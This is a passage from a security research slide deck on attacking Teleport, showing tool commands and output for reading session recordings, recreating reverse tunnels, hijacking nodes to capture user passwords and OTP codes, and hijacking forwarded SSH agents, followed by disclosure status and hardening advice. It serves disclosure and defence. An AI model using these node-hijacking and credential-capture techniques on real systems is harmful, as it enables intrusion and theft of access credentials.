[92019612-2141-4eb6-88fc-d180562214d2]: localuser@teleport-node - 2026-07-01 18:35:54.924 +0000 UTC - 74665 seconds
[d42138d2-54bf-4fed-9f7b-8e5d46a65941]: localuser@teleport-node - 2026-07-02 14:28:52.313 +0000 UTC - 29 seconds
[dc55bc61-3ef0-4e54-8fe4-4afb97cdf027]: localuser@teleport-node - 2026-07-02 14:30:17.442 +0000 UTC - 14 seconds

❯
```

## Slide 75

```text
❯ go run log-viewer/main.go list --cert /tmp/node.crt --key /tmp/node.key --proxy xpn-teleport-server:8443

[b9c5c4ca-3ae0-43a0-8d4a-9eac4482f188]: localuser@teleport-node - 2026-06-29 12:30:57.867 +0000 UTC - 1 seconds
[c10decb0-0ffa-47a9-8a38-3903a03516f3]: localuser@teleport-node - 2026-06-29 15:57:43.087 +0000 UTC - 2735 seconds
[4fe5f304-e67b-42cb-a2dd-9a7d2e987812]: localuser@teleport-node - 2026-06-30 14:03:20.967 +0000 UTC - 16 seconds
[2f8596b0-d287-4b66-b189-2a565c630a3c]: localuser@teleport-node - 2026-06-30 14:06:43.194 +0000 UTC - 74 seconds
[c686e643-a18b-49f9-8176-86bb02a36297]: localuser@teleport-node - 2026-06-30 14:07:10.364 +0000 UTC - 17 seconds
[92019612-2141-4eb6-88fc-d180562214d2]: localuser@teleport-node - 2026-07-01 18:35:54.924 +0000 UTC - 74665 seconds
[d42138d2-54bf-4fed-9f7b-8e5d46a65941]: localuser@teleport-node - 2026-07-02 14:28:52.313 +0000 UTC - 29 seconds
[dc55bc61-3ef0-4e54-8fe4-4afb97cdf027]: localuser@teleport-node - 2026-07-02 14:30:17.442 +0000 UTC - 14 seconds

❯
```

Recording: https://youtu.be/Ca3D8HLS2qg

## Slide 76

# Tunneling to SSH

Now we can talk about one of the main features of Teleport, SSH Tunneling

1. ALPN teleport-proxy-ssh-grpc
2. gRPC connection made to TransportService
3. ProxySSH method used to establish streaming proxy

## Slide 77

# Tunneling to SSH

That gets us to here

Auth Server

Proxy Server

User

Node Service

What about here?

## Slide 78

# Tunneling to SSH

Services use SSH to establish a reverse-tunnel to the proxy

1.TLS connection made to Auth Server from Node with ALPN teleport-reverse

2.SSH connection over this TLS connection is setup with Node’s SSH key and certificate

Once SSH connection is up, outbound channels created:

- teleport-heartbeat channel for keep-alive

Inbound channels also established:

- teleport-discovery for information on available proxies
- teleport-transport for handling new incoming connections

## Slide 79

# Reverse Tunneling

When a teleport-transport channel is established, an out of band request is sent from the Teleport auth server when a new connection is being made inbound:

{ "address":"@local-node", "server_id":"0d145b12-f974-4641-8033-791554f4de66.tps.cerberus-ostrich.ts.net", "conn_type":"node", "client_src_addr":"192.0.2.254:62027", "client_dst_addr":"127.0.0.1:443" }

This tells the SSH node:

1. The inbound client connecting
2. The connection type being requested (node)

Once received, data sent over the established teleport-transport channel will be tunneled between the local node service and the remote client.

## Slide 80

# Tunneling to SSH

Reverse-Tunnel tool created to help recreate this reverse tunnel

Takes Node keys

Host to forward to

```text
./reverse-tunnel \
-c /tmp/node-ssh.crt \
-k /tmp/node.key \
-x 127.0.0.1:9090 \
-u 'b14086e9-0294-408d-9b76-0405f2409929.example.com' \
-o 127.0.0.1:23

[*] teleport-transport-dial request sent
[*] New channel requested: teleport-discovery
[*] Received request on teleport-discovery channel: discovery
[*] New channel requested: teleport-transport
[*] Received request on teleport-transport channel: teleport-transport-dial
[*] Payload: {"address":"@local-node","conn_type":"node","client_src_addr":"10.1.10.22:36634","client_dst_addr":"127.0.0.1:8443"}
```

## Slide 81

# Node Hijacking

Compromised Node credentials also have permission to update other Node objects on the Auth Server

This allows us to perform a hijacking attack, where we:

1. Invoke the UpsertNode API to rename an existing victim Node
2. Invoke the GenerateHostCerts API to craft and sign new certs with same Hostname
3. Run reverse-tunnel tool to receive connections to our victim

## Slide 82

# Node Hijacking

Node-Hijack allows us to carry out this attack

```text
localuser@teleport-user:~$ tsh ssh --user regular-user --proxy teleport-server:8443 teleport-node
Enter password for Teleport user regular-user:
Enter an OTP code from a device:
```

```text
go run ./main.go hijack \
    -c /tmp/node.crt \
    -k /tmp/node.key \
    -n 58102c12-cf6a-4fd9-b74f-8a6c0e93765f

[*] Press Enter to clean up...

[*] SSH Server Started on port 2223
[*] Renaming hostname: teleport-node-2 to teleport-node-2-archived
[*] Adding Node to hijack: teleport-node-2
[*] Hijacked Node: teleport-node-2
```

## Slide 83

# Node Hijacking Demo

```text
go run ./main.go hijack -c /tmp/node.crt -k /tmp/node.key -n 58102c12-cf6a-4fd9-b74f-8a6c0e93765f

[*] Press Enter to clean up...
[*] SSH Server Started on port 2223
[*] Renaming hostname: teleport-node-2 to teleport-node-2-archived
[*] Adding Node to hijack: teleport-node-2

[*] Hijacked Node: teleport-node-2
[*] Renaming hostname: teleport-node-2 to teleport-node-2-archived
[*] Adding Node to hijack: teleport-node-2

[*] Hijacked Node: teleport-node-2
[\o/] New credentials hijacked: user=localuser password=thisimypassword otp=12345678
```

```text
localuser@teleport-user:~$ tsh ls
Node Name           Address        Labels
------------------- -------------- ------
teleport-node        ← Tunnel
teleport-node-2      ← Tunnel
xpn-teleport-server 127.0.0.1:3022

localuser@teleport-user:~$ tsh ls
Node Name                Address        Labels
------------------------ -------------- ------
teleport-node             ← Tunnel
teleport-node-2           ← Tunnel
teleport-node-2-archived  ← Tunnel
xpn-teleport-server      127.0.0.1:3022

localuser@teleport-user:~$ tsh ^C
localuser@teleport-user:~$ tsh ssh teleport-node-2
Enter password for Teleport user localuser:
Enter an OTP code from a device:
the connection was closed on the remote side at  07 Jul 26 10:43 EDT
localuser@teleport-user:~$
```

## Slide 84

```text
go run ./main.go ssh -c /tmp/node.crt -k /tmp/node.key -n teleport-node-2 -o /tmp/hijack-certs/
```

Recording: https://youtu.be/32QrQvVMPl8

## Slide 85

# Node Hijacking Agent

But there is more.

If we are forwarding our SSH agent, there is an issue, the option to forward SSH agents (on / off) is controlled on the node SSH side, not on the client side

This means that our fake SSH server won’t deny this, we just accept any agent Teleport adds in the certificate of the user SSH access, so we can just hijack this.

```text
localuser@teleport-user:~$ tsh status
> Profile URL:        https://teleport-server:8443
  Logged in as:      regular-user
  Cluster:           example.com
  Roles:             access
  Logins:            localuser
  Kubernetes:        enabled
  Valid until:       2026-07-07 19:17:52 -0400 EDT [valid for 8h27m]
  Extensions:        login-ip, permit-agent-forwarding, permit-port-forwarding, permit-pty,
                     private-key-policy
```

## Slide 86

# Node Forwarding Demo

```text
❯ cd ../node-hijack
❯ go run ./main.go mitm -c /tmp/hijack-certs/host_tls_signed.crt -k /tmp/hijack-certs/host.key -n d1c11d95-883c-4062-a71a-7f0c709cc402

[*] SSH Server Started on port 2223

[*] Agent connected, listing keys
[*] Key: ssh-ed25519-cert-v01@openssh.com
[*] Key: ssh-ed25519
details:{}
localuser@teleport-node-2:~$ ls
localuser@teleport-node-2:~$ ls /tmp
```

```text
localuser@teleport-user:~$ tsh ssh -A teleport-node-2
localuser@teleport-node-2:~$ ls
localuser@teleport-node-2:~$ ls /tmp
```

## Slide 87

```text
❯ cd ../node-hijack
❯ go run ./main.go mitm -c /tmp/hijack-certs/host_tls_signed.crt -k /tmp/hijack-certs/host.key -n d1c11d95-883c-4062-a71a-7f0c709cc402

[*] SSH Server Started on port 2223

[*] Agent connected, listing keys
[*] Key: ssh-ed25519-cert-v01@openssh.com
[*] Key: ssh-ed25519
details:{}
localuser@teleport-node-2:~$ ls
localuser@teleport-node-2:~$ ls /tmp
```

```text
localuser@teleport-user:~$ tsh ssh -A teleport-node-2
localuser@teleport-node-2:~$ ls
localuser@teleport-node-2:~$ ls /tmp
```

Recording: https://youtu.be/RaDHaAkTdx8

## Slide 88

# Hardening

First a big thanks to Teleport.

Disclosed issues, and immediately they got to work triaging and prioritizing.

- Node System Role Recording Access - Fixed in 18.7.4 and 17.7.26
- Node/App/DB System Role Permissions - Upcoming fix for Blackhat
- SSH Agent Forwarding - No fix for now
- IronRDP Smartcard PIN Bypass - 18.9.0 and 17.7.25

## Slide 89

# Hardening

Best practices for segmentation and restricting access to ports still matters:

- Can’t pull off the Database certificate attack if we can’t access the Database port
- Can’t pull off the RDP golden certificate attack if we can’t access RDP port

CA certificates are per-cluster, review if your QA database need to be in the same cluster as production

Audit logs are your friend

## Slide 90

# Thanks & Any Questions?

All of the tools shown in this presentation will be available on GitHub

https://github.com/xpn/TAK

@_xpn_

/in/xpn

https://blog.xpnsec.com

